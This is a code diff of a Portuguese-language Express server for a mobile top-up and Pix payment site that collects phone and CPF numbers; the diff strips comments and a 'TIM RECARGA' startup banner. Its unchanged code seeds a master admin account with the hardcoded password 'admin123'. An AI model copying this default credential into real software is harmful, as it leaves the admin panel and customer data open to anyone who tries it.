@@ -33,7 +33,7 @@ const pool = new Pool({
   connectionTimeoutMillis: 10000,
 });
 
-// ============ HELPERS ============
+
 function getClientIP(req) {
   return req.clientIp || req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
 }
@@ -93,7 +93,7 @@ function authenticate(req, res, next) {
   }
 }
 
-// ============ INICIALIZAÇÃO DO BANCO ============
+
 async function initDatabase() {
   const client = await pool.connect();
   try {
@@ -191,7 +191,7 @@ async function initDatabase() {
     await client.query(`CREATE INDEX IF NOT EXISTS idx_payments_tid ON payments(transaction_id);`);
     await client.query(`CREATE INDEX IF NOT EXISTS idx_logs_data ON logs(data DESC);`);
 
-    // Admin master padrão
+    
     const adminCheck = await client.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
     if (adminCheck.rows.length === 0) {
       const hashedPassword = bcrypt.hashSync('admin123', 10);
@@ -208,7 +208,7 @@ async function initDatabase() {
       }
     }
 
-    // PIN de acesso administrativo
+    
     const pinCheck = await client.query('SELECT valor FROM config WHERE chave = $1', ['admin_pin']);
     if (pinCheck.rows.length === 0) {
       const pin = gerarPin();
@@ -229,9 +229,9 @@ async function initDatabase() {
 
 initDatabase();
 
-// ============================================================
-// ROTAS PÚBLICAS
-// ============================================================
+
+
+
 
 app.post('/api/create-sale', async (req, res) => {
   const { phone, cpf, value, bonus } = req.body;
@@ -399,9 +399,9 @@ app.post('/api/visitante', async (req, res) => {
   }
 });
 
-// ============================================================
-// ROTAS ADMIN
-// ============================================================
+
+
+
 
 app.post('/api/admin/login', async (req, res) => {
   const { username, password } = req.body;
@@ -452,7 +452,7 @@ app.get('/api/admin/verify', authenticate, (req, res) => {
   res.json({ valid: true, user: req.user });
 });
 
-// ============ TROCAR SENHA ============
+
 app.post('/api/admin/trocar-senha', authenticate, async (req, res) => {
   const { senhaAtual, novaSenha } = req.body;
   const ip = getClientIP(req);
@@ -475,7 +475,7 @@ app.post('/api/admin/trocar-senha', authenticate, async (req, res) => {
   }
 });
 
-// ============ ATUALIZAR PRÓPRIOS DADOS ============
+
 app.put('/api/admin/perfil', authenticate, async (req, res) => {
   const { nome, email } = req.body;
   try {
@@ -490,7 +490,7 @@ app.put('/api/admin/perfil', authenticate, async (req, res) => {
   }
 });
 
-// ============ PIN ADMINISTRATIVO ============
+
 app.get('/api/admin/pin', authenticate, async (req, res) => {
   try {
     const eu = await pool.query('SELECT is_master FROM admin_users WHERE id = $1', [req.user.id]);
@@ -530,7 +530,7 @@ async function verificarPin(pin) {
   return r.rows[0].valor === String(pin);
 }
 
-// ============ GERENCIAR ADMINS (precisa de PIN) ============
+
 app.get('/api/admin/admins', authenticate, async (req, res) => {
   try {
     const eu = await pool.query('SELECT is_master FROM admin_users WHERE id = $1', [req.user.id]);
@@ -629,7 +629,7 @@ app.delete('/api/admin/admins/:id', authenticate, async (req, res) => {
   }
 });
 
-// ============ DASHBOARD E LISTAS ============
+
 app.get('/api/admin/dashboard', authenticate, async (req, res) => {
   try {
     const totalRecargas = await pool.query('SELECT COUNT(*) FROM recargas');
@@ -787,10 +787,7 @@ app.get('/recarga/pix', (req, res) => res.sendFile(path.join(__dirname, 'public'
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log('');
-  console.log('=================================================');
-  console.log('  TIM RECARGA - Servidor Online');
   console.log('  Porta: ' + PORT);
-  console.log('=================================================');
   console.log('');
 });
 
